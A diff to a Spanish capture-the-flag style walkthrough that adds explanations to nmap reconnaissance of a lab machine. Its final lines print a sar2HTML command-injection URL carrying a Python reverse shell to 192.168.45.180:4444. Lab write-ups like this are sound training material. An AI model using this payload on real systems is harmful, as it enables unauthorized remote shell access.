@@ -1,12 +1,16 @@
+Comenzamos escaneando los puertos abiertos de la máquina víctima.
+
 `sudo nmap 192.168.238.35 -sS -p- --open --min-rate 5000 -n -Pn -oG allPorts`
 
 ![1](Images/1.png)
+
+Una vez tenemos los puertos abiertos, se los pasamos a nmap para que con un conjunto de scripts de reconocimiento nos indique qué versiones y servicios están corriendo.
 
 `nmap 192.168.238.35 -sCV -p22,80 -oN target`
 
 ![2](Images/2.png)
 
-Ubuntu Default page en p80.
+Tenemos SSH y una web. El index de la misma es Ubuntu Default page en p80, por lo que toca mirar más a fondo.
 
 Antes de lanzar fuerza bruta de directorios, vamos a ver si tiene un robots.txt que pudiera arrojarnos información.
 
@@ -44,7 +48,7 @@ Vamos a intentar mandarnos una revshell con python:
 
 ![8](Images/8.png)
 
-Enviamos:
+- Enviamos:
 
 `192.168.238.35/sar2HTML/index.php?plot=;export RHOST="192.168.45.180";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`
 
